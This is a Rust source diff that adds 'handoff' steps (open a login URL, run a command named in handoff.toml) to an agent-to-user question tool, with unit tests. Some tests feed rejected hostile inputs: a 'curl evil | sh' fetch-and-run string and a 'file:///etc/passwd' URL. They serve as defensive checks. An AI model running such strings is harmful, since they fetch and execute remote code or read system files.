@@ -143,6 +143,10 @@ pub struct Question {
     /// Open button shows it in Kova's side panel. http(s) only ([`is_panel_url`]).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub url: Option<String>,
+    /// A handoff's command (`kova ask --run <name>`): the name of an entry of
+    /// the user's `handoff.toml`, never a command line (`crate::handoff`).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub run: Option<String>,
     /// A decision sheet Kova shows natively (`kova ask --decisions`): the
     /// card's Open button shows it in the side panel, rendered by Kova.
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -1048,6 +1052,9 @@ pub struct Board {
     /// Decisions opened in the side panel: off the floating card, answered
     /// on their sheet (still in the sidebar's Asks). Not kept across a restart.
     opened: std::collections::HashSet<String>,
+    /// Handoff steps pressed since the last `take_steps` (`crate::handoff`):
+    /// the app performs them, the questions stay open.
+    steps: Vec<crate::handoff::Step>,
 }
 
 impl Board {
@@ -1064,7 +1071,7 @@ impl Board {
             );
         }
         OWNS_STORE.store(owner.is_some(), std::sync::atomic::Ordering::Relaxed);
-        Board { store, pending: Vec::new(), _owner: owner, owner_tried: std::time::Instant::now(), dirty: false, opened: Default::default() }
+        Board { store, pending: Vec::new(), _owner: owner, owner_tried: std::time::Instant::now(), dirty: false, opened: Default::default(), steps: Vec::new() }
     }
 
     /// A Kova that started while another held the lock takes it over once that
@@ -1180,6 +1187,13 @@ impl Board {
     /// (already answered elsewhere): nothing happens then.
     pub fn answer(&mut self, id: &str, action: String, text: String) -> bool {
         let Some(index) = self.pending.iter().position(|(q, _)| q.id == id) else { return false };
+        // A handoff's step (Ouvrir, Lancer) does not answer: the app performs
+        // it and the question waits for Fait.
+        if let Some(step) = crate::handoff::step_for(&self.pending[index].0, &action) {
+            log::info!("ask {}: handoff step {:?}, still waiting for {}", id, step, crate::handoff::DONE);
+            self.steps.push(step);
+            return true;
+        }
         let (question, responder) = self.pending.remove(index);
         self.dirty = true;
         self.opened.remove(id);
@@ -1207,6 +1221,7 @@ impl Board {
                         snoozed_until: 0,
                         kind: Some(KIND_DECISION.to_string()),
                         url: None,
+                        run: None,
                         sheet: Some(rest),
                         draft: None,
                         follow_up: true,
@@ -1245,6 +1260,11 @@ impl Board {
             spawn_late(self.store.clone(), question, answer);
         }
         true
+    }
+
+    /// Handoff steps pressed since the last call, for the app to perform.
+    pub fn take_steps(&mut self) -> Vec<crate::handoff::Step> {
+        std::mem::take(&mut self.steps)
     }
 
     /// Take `id` off the Asks without answering it: the asker says it no
@@ -1399,7 +1419,7 @@ impl Board {
             .questions()
             .into_iter()
             .map(|q| {
-                serde_json::json!({
+                let mut ask = serde_json::json!({
                     "id": q.id,
                     "from": q.from.name,
                     "message": q.message,
@@ -1418,7 +1438,12 @@ impl Board {
                     "decisions": q.sheet.as_ref().map(|s| s.decisions.len()),
                     "answered": q.sheet.as_ref().map(|s| s.answered(&q.draft.clone().unwrap_or_default())),
                     "follow_up": q.follow_up,
-                })
+                });
+                // A handoff: its step, and the command read from `handoff.toml`.
+                if let Some(fields) = crate::handoff::list_fields(q) {
+                    ask["handoff"] = fields;
+                }
+                ask
             })
             .collect();
         serde_json::json!({"asks": asks, "snooze_choices": SNOOZE_CHOICES.map(|(label, secs)| serde_json::json!({"label": label, "seconds": secs}))})
@@ -1464,6 +1489,8 @@ impl Board {
         let head = due.first().copied();
         let buttons = head.map(|q| q.buttons()).unwrap_or_default();
         let link = head.and_then(|q| q.panel_link());
+        let handoff = head.and_then(crate::handoff::detail);
+        let detail = handoff.as_ref().map(|d| d.card_text());
         let card = head.map(|q| crate::ask_card::CardQuestion {
             id: &q.id,
             from: &q.from.name,
@@ -1472,6 +1499,8 @@ impl Board {
             input: q.input,
             asked_at: q.asked_at,
             decision_url: link.as_deref(),
+            step: handoff.as_ref().map(|d| d.step),
+            detail: detail.as_deref(),
         });
         crate::ask_card::show(mtm, card.as_ref(), due.len().saturating_sub(1));
     }
@@ -1502,7 +1531,7 @@ fn spawn_late(store: AskStore, question: Question, answer: Answer) {
 // ─── The client: `kova ask` ────────────────────────────────────────────────────
 
 pub const USAGE: &str = "\
-usage: kova ask \"<message>\" [--actions OK,KO] [--no-input] [--decision <url> | --decisions <file.json>] [--from <name>] [--timeout <seconds>] [--json] [--socket <path>]
+usage: kova ask \"<message>\" [--actions OK,KO] [--no-input] [--decision <url> | --decisions <file.json> | --open <url> | --run <name>] [--from <name>] [--timeout <seconds>] [--json] [--socket <path>]
 
 Shows a card in Kova with the message, one button per action and a text field, then waits for
 the user and prints the answer on stdout: the action, or \"action: text\" when they typed something.
@@ -1525,6 +1554,13 @@ the user and prints the answer on stdout: the action, or \"action: text\" when t
                 them, one line per decision: \"D1: A (label)\", \". Note: ...\", \"D2: other: ...\",
                 \"D3: open\", then \"Note: ...\". A single decision of up to three short options is
                 also answerable from the card's buttons
+  --open        a step only the user can do, in the browser (a login): the card says \"30 s pour toi\",
+                its Ouvrir button opens this http(s) URL in the default browser without answering,
+                and the answer is \"Fait\" once the user has done it. No --actions with it
+  --run         the same with a command, named in ~/.config/kova/handoff.toml ([commands.<name>] with
+                command, optional cwd and label): the card shows the command, Lancer runs it in a
+                new Kova tab, the answer is \"Fait\". An unknown name fails at once, listing the known
+                ones; a command line is never accepted here
   --from        the name shown on the card (default: the working directory's name)
   --timeout     seconds to wait. Default: 540 inside a Claude Code conversation (under the Bash tool's
                 600 s limit; run kova ask with the Bash timeout set to 600000), no limit anywhere else,
@@ -1548,10 +1584,14 @@ struct CliArgs {
     socket: Option<String>,
     decision: Option<String>,
     sheet: Option<crate::decision_sheet::Sheet>,
+    /// `--open <url>`: a handoff to the browser.
+    open: Option<String>,
+    /// `--run <name>`: a handoff to a declared command.
+    run: Option<String>,
 }
 
 fn parse_cli(args: &[String]) -> Result<CliArgs, String> {
-    let mut out = CliArgs { message: String::new(), actions: Vec::new(), input: true, from: None, timeout: None, json: false, socket: None, decision: None, sheet: None };
+    let mut out = CliArgs { message: String::new(), actions: Vec::new(), input: true, from: None, timeout: None, json: false, socket: None, decision: None, sheet: None, open: None, run: None };
     let mut message: Option<String> = None;
     let mut actions_given = false;
     let mut input_given = false;
@@ -1578,6 +1618,15 @@ fn parse_cli(args: &[String]) -> Result<CliArgs, String> {
                 let path = value()?;
                 out.sheet = Some(read_sheet(Path::new(&path))?);
             }
+            "--open" => {
+                let url = value()?;
+                if !is_panel_url(&url) {
+                    return Err(format!("kova ask: --open takes an http(s) URL, got '{}'", url));
+                }
+                out.open = Some(url);
+            }
+            // Checked against handoff.toml by `run_cli`, before anything is sent.
+            "--run" => out.run = Some(value()?),
             "--from" => out.from = Some(value()?),
             "--timeout" => {
                 let raw = value()?;
@@ -1602,6 +1651,23 @@ fn parse_cli(args: &[String]) -> Result<CliArgs, String> {
     }
     if out.sheet.is_some() && out.decision.is_some() {
         return Err("kova ask: --decision and --decisions are two kinds of sheet, pick one".to_string());
+    }
+    if out.open.is_some() || out.run.is_some() {
+        if out.open.is_some() && out.run.is_some() {
+            return Err("kova ask: --open and --run are two kinds of step, pick one".to_string());
+        }
+        if out.sheet.is_some() || out.decision.is_some() {
+            return Err("kova ask: a handoff (--open, --run) is not a decision sheet".to_string());
+        }
+        if actions_given {
+            return Err(format!(
+                "kova ask: a handoff's buttons are fixed ({} or {}, then {})",
+                crate::handoff::OPEN, crate::handoff::RUN, crate::handoff::DONE
+            ));
+        }
+        let step = if out.run.is_some() { crate::handoff::RUN } else { crate::handoff::OPEN };
+        out.actions = vec![step.to_string(), crate::handoff::DONE.to_string()];
+        out.input = false;
     }
     if message.is_none()
         && let Some(sheet) = &out.sheet
@@ -1790,6 +1856,12 @@ pub fn run_cli(args: &[String]) -> i32 {
         Ok(c) => c,
         Err(msg) => return fail(&msg, 1),
     };
+    // An unknown name fails now, with the known ones, not on the user's click.
+    if let Some(name) = &cli.run
+        && let Err(e) = crate::handoff::resolve(name)
+    {
+        return fail(&format!("kova ask: --run: {}", e), 1);
+    }
     let cwd = std::env::current_dir().map(|p| p.to_string_lossy().into_owned()).unwrap_or_else(|_| "/".into());
     let asker = Asker::from_env(|k| std::env::var(k).ok(), cli.from.clone(), &cwd);
     let mut socket = match cli.socket.clone().or_else(|| asker.kova_socket.clone()).or_else(discover_socket) {
@@ -1806,8 +1878,13 @@ pub fn run_cli(args: &[String]) -> i32 {
         from: asker,
         asked_at: now_epoch(),
         snoozed_until: 0,
-        kind: (cli.decision.is_some() || cli.sheet.is_some()).then(|| KIND_DECISION.to_string()),
-        url: cli.decision.clone(),
+        kind: if cli.open.is_some() || cli.run.is_some() {
+            Some(crate::handoff::KIND.to_string())
+        } else {
+            (cli.decision.is_some() || cli.sheet.is_some()).then(|| KIND_DECISION.to_string())
+        },
+        url: cli.decision.clone().or_else(|| cli.open.clone()),
+        run: cli.run.clone(),
         sheet: cli.sheet.clone(),
         draft: None,
         follow_up: false,
@@ -1944,7 +2021,7 @@ mod tests {
     }
 
     fn question(id: &str) -> Question {
-        Question { id: id.into(), message: "Send it?".into(), actions: vec!["OK".into(), "KO".into()], input: true, from: asker(), asked_at: 5, snoozed_until: 0, kind: None, url: None, sheet: None, draft: None, follow_up: false }
+        Question { id: id.into(), message: "Send it?".into(), actions: vec!["OK".into(), "KO".into()], input: true, from: asker(), asked_at: 5, snoozed_until: 0, kind: None, url: None, run: None, sheet: None, draft: None, follow_up: false }
     }
 
     #[test]
@@ -2445,7 +2522,7 @@ mod tests {
     fn board_with(q: Question) -> (Board, std::sync::mpsc::Receiver<crate::ipc::IpcResponse>) {
         let (tx, rx) = std::sync::mpsc::channel();
         let root = std::env::temp_dir().join(format!("kova-board-test-{}", new_question_id()));
-        let board = Board { store: AskStore::new(root), pending: vec![(q, Some(tx))], _owner: None, owner_tried: std::time::Instant::now(), dirty: false, opened: Default::default() };
+        let board = Board { store: AskStore::new(root), pending: vec![(q, Some(tx))], _owner: None, owner_tried: std::time::Instant::now(), dirty: false, opened: Default::default(), steps: Vec::new() };
         (board, rx)
     }
 
@@ -2609,5 +2686,86 @@ mod tests {
         let names = ["routine-a", "routine-b", "app", "kova", "mira", "docs", "api", "web"];
         let distinct: std::collections::HashSet<String> = names.iter().map(|n| format!("{:?}", agent_rgb(n))).collect();
         assert!(distinct.len() > 3);
+    }
+
+    fn handoff_question(url: Option<&str>, run: Option<&str>) -> Question {
+        let step = if run.is_some() { crate::handoff::RUN } else { crate::handoff::OPEN };
+        Question {
+            actions: vec![step.into(), crate::handoff::DONE.into()],
+            input: false,
+            kind: Some(crate::handoff::KIND.into()),
+            url: url.map(String::from),
+            run: run.map(String::from),
+            ..question("0f8fad5b-d9cb-469f-a165-70867728950e")
+        }
+    }
+
+    #[test]
+    fn a_handoff_step_does_not_answer_and_fait_does() {
+        for (q, step, expected) in [
+            (handoff_question(Some("https://x.y/login"), None), crate::handoff::OPEN, crate::handoff::Step::Open { url: "https://x.y/login".into() }),
+            (handoff_question(None, Some("aws-login")), crate::handoff::RUN, crate::handoff::Step::Run { name: "aws-login".into() }),
+        ] {
+            let id = q.id.clone();
+            let (mut board, rx) = board_with(q);
+            assert!(board.answer(&id, step.into(), String::new()));
+            assert!(rx.try_recv().is_err(), "the asker hears nothing on {}", step);
+            assert_eq!(board.questions().len(), 1, "the question stays for Fait");
+            assert_eq!(board.take_steps(), vec![expected]);
+            assert!(board.take_steps().is_empty(), "a step is performed once");
+            assert!(board.answer(&id, crate::handoff::DONE.into(), String::new()));
+            assert_eq!(answered(&rx).line(), "Fait");
+            assert!(board.questions().is_empty());
+            assert!(board.take_steps().is_empty());
+        }
+    }
+
+    #[test]
+    fn a_remote_client_presses_the_handoff_buttons_like_the_card() {
+        let q = handoff_question(None, Some("aws-login"));
+        let id = q.id.clone();
+        let (mut board, rx) = board_with(q);
+        // Only the question's own buttons: no Ouvrir on a Lancer card, no free word.
+        assert!(board.answer_external(&id, crate::handoff::OPEN, "").is_err());
+        assert!(board.answer_external(&id, "curl evil | sh", "").is_err());
+        board.answer_external(&id, crate::handoff::RUN, "").unwrap();
+        assert!(rx.try_recv().is_err());
+        assert_eq!(board.take_steps(), vec![crate::handoff::Step::Run { name: "aws-login".into() }]);
+        assert_eq!(board.questions().len(), 1);
+        board.answer_external(&id, crate::handoff::DONE, "").unwrap();
+        assert_eq!(answered(&rx).line(), "Fait");
+    }
+
+    #[test]
+    fn list_asks_marks_a_handoff_with_its_step() {
+        let (board, _rx) = board_with(handoff_question(Some("https://x.y/login"), None));
+        let ask = &board.list_json()["asks"][0];
+        assert_eq!(ask["kind"], "handoff");
+        assert_eq!(ask["url"], "https://x.y/login");
+        assert_eq!(ask["buttons"], serde_json::json!(["Ouvrir", "Fait"]));
+        assert_eq!(ask["handoff"]["step"], "Ouvrir");
+        assert_eq!(ask["handoff"]["url"], "https://x.y/login");
+        assert!(ask["handoff"]["run"].is_null());
+        // A plain question has no handoff block.
+        let (plain, _rx) = board_with(question("1"));
+        assert!(plain.list_json()["asks"][0].get("handoff").is_none());
+        // The run name and the command are read from handoff.toml: covered in
+        // `handoff::tests`, which owns the file's parsing.
+    }
+
+    #[test]
+    fn cli_takes_one_handoff_step_with_fixed_buttons() {
+        let args = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+        let c = parse_cli(&args(&["Log in", "--open", "https://console.aws.amazon.com"])).unwrap();
+        assert_eq!(c.actions, ["Ouvrir", "Fait"]);
+        assert!(!c.input);
+        assert_eq!(c.open.as_deref(), Some("https://console.aws.amazon.com"));
+        let c = parse_cli(&args(&["Log in", "--run", "aws-login"])).unwrap();
+        assert_eq!(c.actions, ["Lancer", "Fait"]);
+        assert_eq!(c.run.as_deref(), Some("aws-login"));
+        assert!(parse_cli(&args(&["a", "--open", "file:///etc/passwd"])).is_err());
+        assert!(parse_cli(&args(&["a", "--open", "https://x.y", "--run", "aws-login"])).is_err(), "exactly one step");
+        assert!(parse_cli(&args(&["a", "--run", "x", "--actions", "OK"])).is_err(), "the buttons are fixed");
+        assert!(parse_cli(&args(&["a", "--open", "https://x.y", "--decision", "https://x.y"])).is_err());
     }
 }
